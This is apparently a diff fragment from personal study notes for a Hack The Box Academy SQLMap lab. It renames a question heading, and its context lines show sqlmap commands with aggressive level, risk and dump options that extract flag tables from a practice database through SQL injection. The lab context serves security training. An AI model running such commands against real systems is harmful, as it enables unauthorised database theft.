@@ -109,7 +109,7 @@ sqlmap -r case6.req --batch -p 'col' --level=5 --risk=3 --prefix='`)' -D testdb 
 sqlmap -r case7.req --batch -dbms MySQL --union-cols=5 -D testdb -T flag7 --dump --no-cast --flush-session
 ```  
 
->[Question - Database Enumeration](https://academy.hackthebox.com/module/58/section/510)  
+>[Question - Database Enumeration - current user db is-dba](https://academy.hackthebox.com/module/58/section/510)  
 
 >What's the contents of table `flag1` in the `testdb` database? (Case #1)
 >Detect and exploit SQLi vulnerability in GET parameter id
